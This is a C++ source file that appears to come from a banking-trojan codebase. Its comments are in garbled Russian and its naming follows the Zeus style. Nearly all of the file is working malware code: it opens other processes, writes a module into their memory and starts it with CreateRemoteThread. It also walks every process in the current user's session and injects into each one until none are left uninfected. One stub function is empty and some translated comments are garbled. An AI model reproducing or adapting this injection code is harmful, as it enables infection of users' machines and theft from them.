#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "coreinject.h"

#include "..\common\debug.h"
#include "..\common\process.h"

/*
  Ïåðìåííàÿ â êîòîðóþ áèëäåð ñîõçðàíÿåò áàçîîâûå äàííûå äëÿ áîòà.
  Äàííàÿ ïåðåìåííàÿ äîëæíû íàõîäèòüñÿ â ïðîèçâîëáíîì cpp-ôàéëå, äëÿ îáåñïå÷åíèÿ ðàíäîìèçàöèè åå
  àäðåñà.
*/
extern const char baseConfigSource[sizeof(BASECONFIG)] = {'B', 'A', 'S', 'E', 'C', 'O', 'N', 'F', 'I', 'G'};

/*Â Â Inject code in a particular process.

Â Â IN pid - ID of the process.
Â Â IN processMutex - myuteks process.
Â Â IN proccessFlags - data for the new coreData.proccessFlags, tekschie data inherited by the mask
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Core:: CDPT_INHERITABLE_MASK.

Â Â Return - true - if successful,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â false - if an error occurs.*/
static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
{
  bool ok = false;
  HANDLE process = CWA(kernel32, OpenProcess)(PROCESS_QUERY_INFORMATION |
                                              PROCESS_VM_OPERATION |
                                              PROCESS_VM_WRITE |
                                              PROCESS_VM_READ |
                                              PROCESS_CREATE_THREAD |
                                              PROCESS_DUP_HANDLE,
                                              FALSE, pid);

  if(process != NULL)
  {
    void *newImage = Core::initNewModule(process, processMutex, proccessFlags);
    if(newImage != NULL)
    {
      LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)((LPBYTE)newImage + (DWORD_PTR)((LPBYTE)Core::_injectEntryForThreadEntry - (LPBYTE)coreData.modules.current));
      HANDLE thread = CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, 0, NULL);

      if(thread != NULL)
      {
        WDEBUG2(WDDT_INFO, "newImage=0x%p, thread=0x%08X", newImage, thread);
        if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
        {
          WDEBUG2(WDDT_WARNING, "Failed to wait for thread end, newImage=0x%p, thread=0x%08X", newImage, thread);
        }
        CWA(kernel32, CloseHandle)(thread);
        ok = true;
      }
      else
      {
        WDEBUG1(WDDT_ERROR, "Failed to create remote thread in process with id=%u.", pid);
        CWA(kernel32, VirtualFreeEx)(process, newImage, 0, MEM_RELEASE);
      }
    }
#   if(BO_DEBUG > 0)
    else WDEBUG1(WDDT_ERROR, "Failed to alloc code in process with id=%u.", pid);
#   endif

    CWA(kernel32, CloseHandle)(process);
  }
#if(BO_DEBUG > 0)
  else WDEBUG1(WDDT_ERROR, "Failed to open process with id=%u.", pid);
#endif

  return ok;
}

static bool InjectMalware(void)
{
}

void CoreInject::init(void)
{

}

void CoreInject::uninit(void)
{

}

bool CoreInject::_injectToAll(void)
{
  bool ok = false;

  WDEBUG0(WDDT_INFO, "Listing processes...");  

  //Ishim process until until ostnetsya not infected.
  LPDWORD injectedPids    = NULL;
  DWORD injectedPidsCount = 0;
  DWORD newProcesses;

  do
  {
    HANDLE snap = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);  
    newProcesses = 0;

    if(snap != INVALID_HANDLE_VALUE)
    {
      PROCESSENTRY32W pe;
      pe.dwSize = sizeof(PROCESSENTRY32W);

      if(CWA(kernel32, Process32FirstW)(snap, &pe))do
      {
        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid)
        {
          TOKEN_USER *tu;
          DWORD sessionId;
          DWORD sidLength;

          //Checking sushetvuet whether ID is already in the list.
          for(DWORD i = 0; i < injectedPidsCount; i++)if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT;

          HANDLE mutexOfProcess = Core::createMutexOfProcess(pe.th32ProcessID);
          if(mutexOfProcess == NULL)goto SKIP_INJECT;

          //Obtain the SID of the process and compare it with the SID streamed process.
          if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)
          {
            //WDEBUG2 (WDDT_INFO, "sessionId = \"% u \ ", coreData.currentUser.id = \"% u \ "", sessionId, coreData.currentUser.id);
            if(sessionId == coreData.currentUser.sessionId &&
               (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
               Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
            {
              //SID'y equal.
              if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
              {
                injectedPids[injectedPidsCount++] = pe.th32ProcessID;
                newProcesses++;

                WDEBUG1(WDDT_INFO, "pe.th32ProcessID=%u", pe.th32ProcessID);

                if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0))ok = true;
              }
#             if(BO_DEBUG > 0)
              else WDEBUG0(WDDT_ERROR, "Failed to realloc injectedPids.");
#             endif
            }
            Mem::free(tu);
          }

          CWA(kernel32, CloseHandle)(mutexOfProcess);

SKIP_INJECT:;
        }
      }
      while(CWA(kernel32, Process32NextW)(snap, &pe));

      CWA(kernel32, CloseHandle)(snap);
    }
#   if(BO_DEBUG > 0)
    else WDEBUG0(WDDT_ERROR, "Failed to list processes.");
#   endif
  }
  while(newProcesses != 0);

  Mem::free(injectedPids);

  return ok;
}
